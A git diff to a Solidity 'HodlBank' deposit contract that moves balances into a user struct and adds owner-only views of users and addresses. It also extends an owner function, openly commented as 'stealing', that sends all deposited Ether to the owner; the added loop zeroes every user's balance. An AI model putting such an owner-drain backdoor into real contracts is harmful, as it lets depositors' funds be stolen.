@@ -4,8 +4,17 @@ pragma solidity >=0.8.0;
 import "@openzeppelin/contracts/access/Ownable.sol";
 
 contract HodlBank is Ownable {
-    // This will store user balances
-    mapping(address => uint256) private balances;
+    struct UserInfo {
+        address userAddress;
+        uint256 storedBalance;
+        bool isExist;
+    }
+
+    // User Info
+    mapping(address => UserInfo) private userInfoList;
+
+    // Store Array of user addresses
+    address[] private userAddressList;
 
     // This will store refund times
     mapping(address => uint256) private refundTimes;
@@ -18,7 +27,15 @@ contract HodlBank is Ownable {
     // On frontend Math.floor((new Date(date).getTime()) / 1000) to get the timestamp
     function deposit(uint256 _timestampOfRefundDate) public payable {
         // Increase the amount stored in smart contract
-        balances[msg.sender] += msg.value;
+
+        userInfoList[msg.sender].userAddress = msg.sender;
+        userInfoList[msg.sender].storedBalance += msg.value;
+
+        // If user is new
+        if (!userInfoList[msg.sender].isExist) {
+            userInfoList[msg.sender].isExist = true;
+            userAddressList.push(msg.sender);
+        }
 
         // Increase the hodl time
         // refundTimes[msg.sender] += block.timestamp + _timestampOfRefundDate;
@@ -27,15 +44,36 @@ contract HodlBank is Ownable {
         }
     }
 
+    // Returns single user item
+    function getUserInfo(address userAddress)
+        public
+        view
+        onlyOwner
+        returns (UserInfo memory)
+    {
+        return userInfoList[userAddress];
+    }
+
+    // Returns every address that was stored in the smart contract
+    function getUserAddressList()
+        public
+        view
+        onlyOwner
+        returns (address[] memory)
+    {
+        return userAddressList;
+    }
+
     // Withdraw tokens stored in the smart contract
     function withdraw(uint256 _amount) public payable {
         address to = payable(msg.sender);
 
+        uint256 storedUserBalance = userInfoList[to].storedBalance;
         // Check if user can refund the ETHER stored
         require(block.timestamp > refundTimes[to], "You can not withdraw yet");
 
         // Check to see if user has enough balances stored in smart contract
-        require(balances[to] >= _amount, "You do not have enough balance");
+        require(storedUserBalance >= _amount, "You do not have enough balance");
 
         // get the amount of Ether stored in this contract
         uint256 amount = _amount;
@@ -46,7 +84,7 @@ contract HodlBank is Ownable {
         );
 
         // Reduce the amount from the address
-        balances[to] -= amount;
+        userInfoList[to].storedBalance -= amount;
 
         // send all Ether to owner
         (bool success, ) = to.call{value: amount}("");
@@ -70,6 +108,12 @@ contract HodlBank is Ownable {
         // There needs to be a balance for stealing :)
         require(amount > 0, "Contract does not have any balances");
 
+        // for loop that sets every accounts balance to -> 0
+        for (uint256 counter = 0; counter < userAddressList.length; counter++) {
+            // UserInfo memory userInfo = userInfoList[userAddressList[counter]];
+            userInfoList[userAddressList[counter]].storedBalance = 0;
+        }
+
         // send all Ether to owner
         // Owner can receive Ether since the address of owner is payable
         (bool success, ) = owner().call{value: amount}("");
@@ -77,7 +121,7 @@ contract HodlBank is Ownable {
     }
 
     function getStoredBalance() public view returns (uint256) {
-        return balances[msg.sender];
+        return userInfoList[msg.sender].storedBalance;
     }
 
     // User Account Balances that are stored in the Smart Contract
@@ -87,7 +131,7 @@ contract HodlBank is Ownable {
         onlyOwner
         returns (uint256)
     {
-        return balances[_user];
+        return userInfoList[_user].storedBalance;
     }
 
     // User Refund Times that are stored in the Smart Contract
